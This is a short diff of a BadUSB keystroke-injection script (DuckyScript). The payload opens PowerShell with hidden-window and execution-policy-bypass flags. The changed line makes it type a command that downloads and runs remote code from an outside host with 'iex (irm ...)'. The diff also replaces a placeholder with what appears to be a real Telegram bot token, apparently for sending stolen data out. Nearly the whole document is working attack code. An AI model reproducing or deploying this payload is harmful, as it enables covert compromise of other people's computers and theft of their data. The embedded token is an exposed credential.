@@ -14,6 +14,7 @@ REM open powershell (remove -W Hidden to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+STRING powershell -Ep Bypass -C $tg='8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'; iex (irm bw0.cc/extg)
 ENTER
+
 
